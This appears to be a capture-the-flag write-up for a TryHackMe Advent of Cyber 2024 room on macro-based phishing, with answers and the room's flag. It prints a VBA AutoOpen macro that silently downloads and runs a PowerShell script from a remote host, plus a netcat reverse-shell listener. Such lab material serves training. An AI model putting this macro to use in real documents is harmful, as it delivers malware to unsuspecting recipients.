# Advent of Cyber 2024 - Day 10: Phishing

{% embed url="https://tryhackme.com/room/adventofcyber2024" %}

He had a phishing rod, and cast it in the sea...

## Background

Phishing via weaponized documents remains one of the most common initial access vectors used by threat actors. Macro-enabled Microsoft Word files (`.docm`) allow Visual Basic for Applications (VBA) code to run automatically upon document opening.

Modern defenses rely on Mark of the Web (MotW) and default macro execution blocking. Threat actors use social engineering lures and obfuscated scripts to convince targets to enable content, triggering malicious PowerShell commands.

## Walkthrough

**Step 1 — Inspect the Malicious Document**

Analyze the incoming `.docm` attachment using `oledump.py`:
```bash
oledump.py invoice_holiday.docm
```
Stream 8 contains VBA code. Extract the macro stream:
```bash
oledump.py -s 8 -v invoice_holiday.docm
```

**Step 2 — Reverse Engineer the Macro Logic**

The extracted VBA routine hooks the `AutoOpen()` event:
```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.100.5/stage2.ps1')"
    Shell cmd, vbHide
End Sub
```

**Step 3 — Catch the Reverse Connection**

Set up a Netcat listener on your handler machine:
```bash
nc -lvnp 4444
```
Simulating macro execution establishes a reverse shell, uncovering the target flag.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the file extension for macro-enabled Word documents? | `.docm` |
| What VBA subroutine executes automatically when a document opens? | `AutoOpen` |
| What is the flag retrieved after compromising the target? | `THM{PHISHING_CHRISTMAS}` |
